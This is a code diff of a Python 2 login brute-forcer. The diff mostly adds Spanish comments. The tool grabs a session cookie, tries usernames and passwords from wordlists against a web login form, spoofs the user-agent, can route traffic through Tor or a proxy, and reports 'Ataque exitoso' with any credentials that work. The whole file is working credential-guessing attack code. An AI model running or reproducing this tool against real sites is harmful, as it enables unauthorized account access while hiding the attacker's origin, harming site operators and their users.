@@ -1,14 +1,13 @@
 #!/usr/bin/python
 
-import requests
-import argparse
+import requests # Utilizado para las peticiones
 import sys
-from lxml.html import fromstring
+from lxml.html import fromstring # Utilizado para los enlaces
 import os.path
 from termcolor import colored
-import re
-import socket
-import socks
+import re # Utilizado para regex
+import socket # Tor
+import socks # Tor
 
 def check(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip,tor):
 	b = ['','1','12']
@@ -17,19 +16,19 @@ def check(url, userField, passField, user, pwd, userFile, pwdFile, message,verbo
 	
 	requests.packages.urllib3.disable_warnings()
 	if len(proxip) == 0:
-		if tor == True:
+		if tor == True:  # Peticiones a traves de tor
 			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
 			socket.socket = socks.socksocket
 			proxies = {'http' : 'socks5://127.0.0.1:9050', 'https' : 'socks5://127.0.0.1:9050',}
 			req = requests.get(url,proxies = {'http': 'socks5://127.0.0.1:9050'},verify=False)
 		else:
 			req = requests.get(url,verify=False)
-	else:
+	else: # Peticiones a traves de proxy
 		proxy = proxip  + ':' + proxport
 		proxies = {'http' : proxy, 'https' : proxy,}
 		req = requests.get(url,proxies = {'http':proxy},verify=False)
 	
-	if cookie is None:
+	if cookie is None: # Obtencion de la cookie de sesion
 		for key,value in req.headers.iteritems():
 			if 'set-cookie' in key:
 				regex = re.compile(r'(OJSSID=)((.*);)')
@@ -56,7 +55,7 @@ def check(url, userField, passField, user, pwd, userFile, pwdFile, message,verbo
 
 	
 	requests.packages.urllib3.disable_warnings()	
-	for element in b:
+	for element in b: # REalizacion de las peticiones para ver que devuelve el sitio
 		payload = {userField : element, passField: ''}
 		headers = {'user-agent': agent}
 		cookies = {'': cookie} 
@@ -74,13 +73,13 @@ def check(url, userField, passField, user, pwd, userFile, pwdFile, message,verbo
 			r = requests.post(url,payload,cookies = cookies, headers = headers,proxies = {'http':proxy},verify=False)
 		a.append(len(r.content))
 	
-	if len(userFile) == 0 and len(pwdFile) == 0 and len(user) > 0 and len(pwd) > 0 :
+	if len(userFile) == 0 and len(pwdFile) == 0 and len(user) > 0 and len(pwd) > 0 : # Sin archivos
 		single(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip,a,tor)
-	elif len(user) == 0 and len(pwd) == 0 and len(userFile) > 0 and len(pwdFile) > 0:
+	elif len(user) == 0 and len(pwd) == 0 and len(userFile) > 0 and len(pwdFile) > 0: # Ambos archvios
 		doubleFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip,a,tor)
-	elif len(user) == 0 and len(pwdFile) == 0 and len(pwd) > 0 and len(userFile) > 0:
+	elif len(user) == 0 and len(pwdFile) == 0 and len(pwd) > 0 and len(userFile) > 0: # Archivo de usuarios
 		usersFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip,a,tor)
-	elif len(pwd) == 0 and len(userFile) == 0 and len(user) > 0 and len(pwdFile) > 0:
+	elif len(pwd) == 0 and len(userFile) == 0 and len(user) > 0 and len(pwdFile) > 0: # Archivo de passwords
 		passFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip,a,tor)
 		
 def single(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxip,proxport,list,tor):
@@ -88,7 +87,7 @@ def single(url, userField, passField, user, pwd, userFile, pwdFile, message,verb
 	mbefore = message
 	requests.packages.urllib3.disable_warnings()		
 		
-	payload = { userField : user, passField: pwd}
+	payload = { userField : user, passField: pwd} # Carga del payload
 	
 	headers = {'user-agent': agent}
 	cookies = {'': cookie} 
@@ -169,7 +168,7 @@ def usersFile(url, userField, passField, user, pwd, userFile, pwdFile, message,v
 			mbefore = message
 				
 			#Login
-			payload = { userField : users[i].rstrip('\n'), passField: pwd}
+			payload = { userField : users[i].rstrip('\n'), passField: pwd} # Carga del payload
 			headers = {'user-agent': agent}
 			cookies = {'': cookie} 
 			if len(proxip) == 0:
@@ -249,7 +248,7 @@ def passFile(url, userField, passField, user, pwd, userFile, pwdFile, message,ve
 			mbefore = message
 		
 			#Login
-			payload = { userField : user, passField: passwords[i].rstrip('\n')}
+			payload = { userField : user, passField: passwords[i].rstrip('\n')} # Carga de payload
 			headers = {'user-agent': agent}
 			cookies = {'': cookie} 
 			if len(proxip) == 0:
@@ -314,7 +313,7 @@ def passFile(url, userField, passField, user, pwd, userFile, pwdFile, message,ve
 						print colored('Ataque exitoso con: ', 'green') + 'User: ' + colored(user,'blue') + ' Password: ' + colored(passwords[i].rstrip('\n'),'blue')
 
 	
-def doubleFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip,list,tor):
+def doubleFile(url, userField, passField, user, pwd, userFile, pwdFile, message,verbose,cookie,agent,proxport,proxip,list,tor): # Carga de payload
 	
 	users = []
 	passwords = []
